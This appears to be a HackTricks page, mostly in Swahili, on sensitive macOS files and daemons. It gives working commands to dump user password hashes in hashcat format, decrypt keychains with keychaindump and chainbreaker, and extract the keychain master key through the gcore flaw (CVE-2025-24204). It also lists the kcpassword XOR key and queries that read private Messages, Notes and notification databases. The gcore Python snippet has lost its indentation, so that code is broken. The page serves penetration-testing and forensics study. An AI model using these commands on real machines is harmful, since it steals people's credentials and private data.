# macOS Maeneo Nyeti & Daemons Zinazovutia

{{#include ../../../banners/hacktricks-training.md}}

## Nywila

### Shadow Passwords

Shadow password inahifadhiwa pamoja na usanidi wa mtumiaji katika plists zilizoko katika **`/var/db/dslocal/nodes/Default/users/`**.\
Oneliner ifuatayo inaweza kutumika dump **taarifa zote kuhusu watumiaji** (ikijumuisha hash info):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) zinaweza kutumika kubadilisha hash kuwa katika **hashcat** **format**.

Njia mbadala ya one-liner itakayotoa creds za akaunti zote zisizo za huduma kwa muundo wa hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Njia nyingine ya kupata `ShadowHashData` ya mtumiaji ni kwa kutumia `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Faili hii **inatumika tu** wakati mfumo unaendeshwa katika **single-user mode** (hivyo si mara kwa mara).

### Keychain Dump

Kumbuka kwamba unapotumia binary ya security ili **dump the passwords decrypted**, utaombwa mara kadhaa na maombi yatakayomwomba mtumiaji kuruhusu operesheni hii.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Kulingana na maoni haya [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) inaonekana kwamba zana hizi hazifanyi kazi tena kwenye Big Sur.

### Muhtasari wa Keychaindump

Chombo kinachoitwa **keychaindump** kimeundwa kwa kusafirisha nywila kutoka kwenye macOS keychains, lakini kinakumbana na vizingiti kwenye matoleo mapya ya macOS kama Big Sur, kama ilivyoonekana katika [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Matumizi ya **keychaindump** yanahitaji mshambuliaji kupata ufikiaji na kuinua vibali hadi **root**. Chombo kinatumia ukweli kwamba keychain hufunguliwa kwa chaguo-msingi wakati mtumiaji anapoingia ili kurahisisha matumizi, kuruhusu applications kuifikia bila kuhitaji nenosiri la mtumiaji mara kwa mara. Hata hivyo, ikiwa mtumiaji ataamua kufunga keychain yake baada ya kila matumizi, **keychaindump** haitakuwa na ufanisi.

**Keychaindump** hufanya kazi kwa kulenga mchakato maalum unaoitwa **securityd**, unaoelezewa na Apple kama daemon kwa ajili ya idhini na shughuli za kriptografia, muhimu kwa kupata keychain. Mchakato wa uondoaji unahusisha kutambua **Master Key** inayotokana na nenosiri la kuingia la mtumiaji. Kitufe hiki ni muhimu kwa kusoma faili ya keychain. Ili kupata **Master Key**, **keychaindump** inachambua heap ya kumbukumbu ya **securityd** kwa kutumia amri ya `vmmap`, ikiangalia funguo zinazoweza kuwepo ndani ya maeneo yaliyotajwa kama `MALLOC_TINY`. Amri ifuatayo inatumiwa kuchunguza maeneo haya ya kumbukumbu:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Baada ya kubaini vifunguo vinavyoweza kuwa funguo kuu, **keychaindump** inatafuta kupitia heaps kwa muundo maalum (`0x0000000000000018`) unaoashiria mgombea wa funguo kuu. Hatua zaidi, ikiwa ni pamoja na deobfuscation, zinahitajika ili kutumia funguo hili, kama ilivyoainishwa katika msimbo wa chanzo wa **keychaindump**. Wachambuzi wanaojikita katika eneo hili wanapaswa kutambua kwamba data muhimu kwa decrypting keychain imehifadhiwa ndani ya kumbukumbu ya mchakato wa **securityd**. Mfano wa amri ya kuendesha **keychaindump** ni:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) inaweza kutumika kutoa aina zifuatazo za taarifa kutoka kwenye OSX keychain kwa njia inayofaa kwa uchunguzi wa forensiki:

- Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Iwapo utakuwa na nenosiri la kufungua keychain, funguo kuu iliyopatikana kwa kutumia [volafox](https://github.com/n0fate/volafox) au [volatility](https://github.com/volatilityfoundation/volatility), au faili ya kufungua kama SystemKey, Chainbreaker pia itatoa nenosiri kwa maandishi wazi.

Bila mojawapo ya njia hizi za kufungua Keychain, Chainbreaker itaonyesha taarifa zote nyingine zinazopatikana.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump vifunguo vya keychain (na nywila) kwa SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (na passwords) cracking ya hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with memory dump**

[Follow these steps](../index.html#dumping-memory-with-osxpmem) ili kufanya **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (na passwords) kutumia password ya mtumiaji**

Ikiwa unajua password ya mtumiaji, unaweza kuitumia ili **dump and decrypt keychains zinazomilikiwa na mtumiaji**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) iliwasilishwa na `/usr/bin/gcore` iliyokuwa na ruhusa ya **`com.apple.system-task-ports.read`**, hivyo msimamizi yeyote wa ndani (au app iliyosainiwa yenye nia mbaya) angeweza dump kumbukumbu ya mchakato wowote hata wakati SIP/TCC zikitumika. Dumping `securityd` leaks the **Keychain master key** wazi na inakuwezesha decrypt `login.keychain-db` bila nywila ya mtumiaji.

**Quick repro on vulnerable builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple iliondoa idhinishaji katika **macOS 15.3+**, hivyo hili linafanya kazi tu kwenye Sequoia builds zisizopachikwa au mifumo iliyohifadhi binary yenye udhaifu.

### kcpassword

The **kcpassword** file is a file that holds the **neno la siri la kuingia la mtumiaji**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Taarifa za Kuvutia katika Hifadhidata

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Arifa

Unaweza kupata data za Arifa katika `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Taarifa nyingi za kuvutia ziko ndani ya **blob**. Hivyo utahitaji **kutoa** yaliyomo na **kubadilisha** ili **kusomeka** **kwa binadamu** au kutumia **`strings`**. Ili kuzipata unaweza kufanya:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Masuala ya faragha ya hivi karibuni (NotificationCenter DB)

- Katika macOS **14.7–15.1** Apple ilihifadhi yaliyomo ya banner katika `db2/db` SQLite bila kufichwa ipasavyo. CVEs **CVE-2024-44292/44293/40838/54504** ziliruhusu mtumiaji yeyote wa ndani kusoma maandishi ya arifa za watumiaji wengine kwa tu kufungua DB (hakuna mwonyo wa TCC). Imetatuliwa katika **15.2** kwa kusogeza/kufunga DB; kwenye mifumo ya zamani njia hapo juu bado leaks arifa za karibuni na viambatisho.
- Database iko world-readable tu kwenye builds zilizoathirika, hivyo unapochunguza kwenye legacy endpoints nakili kabla ya kusasisha ili kuhifadhi vielelezo.

### Vidokezo

Watumiaji **notes** zinaweza kupatikana katika `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Mapendeleo

Katika macOS, mapendeleo ya programu yanapatikana katika **`$HOME/Library/Preferences`** na katika iOS yanapatikana katika `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Katika macOS zana ya CLI **`defaults`** inaweza kutumika **kubadilisha faili ya mapendeleo**.

**`/usr/sbin/cfprefsd`** inadai huduma za XPC `com.apple.cfprefsd.daemon` na `com.apple.cfprefsd.agent` na inaweza kuitwa kufanya vitendo kama kubadilisha mapendeleo.

## OpenDirectory permissions.plist

Faili `/System/Library/OpenDirectory/permissions.plist` ina ruhusa zinazotumika kwa sifa za node na inalindwa na SIP.\
Faili hii inawapa watumiaji maalum ruhusa kwa kutumia UUID (na sio uid) ili waweze kupata taarifa nyeti kama `ShadowHashData`, `HeimdalSRPKey` na `KerberosKeys` miongoni mwa nyingine:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Arifa za Mfumo

### Arifa za Darwin

The main daemon for notifications is **`/usr/sbin/notifyd`**. Ili kupokea arifa, clients lazima wajisajili kupitia `com.apple.system.notification_center` Mach port (angalia kwa kutumia `sudo lsmp -p <pid notifyd>`). Daemon inaweza kusanidiwa na faili `/etc/notify.conf`.

Majina yanayotumika kwa arifa ni notations za reverse DNS za kipekee, na wakati arifa itakapotumwa kwa moja ya hayo, client(s) walioonyesha kuwa wanaweza kuishughulikia watapokea.

Inawezekana kutoa hali ya sasa (na kuona majina yote) kwa kutuma signal SIGUSR2 kwa mchakato wa notifyd na kusoma faili iliyotengenezwa: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Kituo cha Arifa Kilichosambazwa

Kituo cha **Distributed Notification Center** ambacho binary kuu ni **`/usr/sbin/distnoted`**, ni njia nyingine ya kutuma arifa. Kinaonyesha baadhi ya huduma za XPC na hufanya ukaguzi fulani ili kujaribu kuthibitisha wateja.

### Apple Push Notifications (APN)

Katika kesi hii, maombi yanaweza kujisajili kwa **topics**. Mteja atatengeneza token kwa kuwasiliana na seva za Apple kupitia **`apsd`**.\
Kisha, providers pia watakuwa wametengeneza token na wataweza kuunganishwa na seva za Apple ili kutuma ujumbe kwa wateja. Ujumbe hizi zitapokelewa kwa ndani na **`apsd`** ambayo itapeleka arifa kwa programu inayosubiri.

Mapendeleo ziko katika `/Library/Preferences/com.apple.apsd.plist`.

Kuna database ya ndani ya ujumbe iliyoko macOS katika `/Library/Application\ Support/ApplePushService/aps.db` na kwenye iOS katika `/var/mobile/Library/ApplePushService`. Ina meza 3: `incoming_messages`, `outgoing_messages` na `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Pia inawezekana kupata taarifa kuhusu daemon na muunganisho kwa kutumia:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Arifa za Mtumiaji

Hizi ni arifa ambazo mtumiaji anapaswa kuziaona kwenye skrini:

- **`CFUserNotification`**: API hii inatoa njia ya kuonyesha kwenye skrini dirisha la pop-up lenye ujumbe.
- **Bodi ya Matangazo**: Hii inaonyesha kwenye iOS bendera (banner) inayotoweka na itahifadhiwa katika Notification Center.
- **`NSUserNotificationCenter`**: Hii ni bulletin board ya iOS katika MacOS. Hifadhidata yenye arifa ziko katika `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Marejeo

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
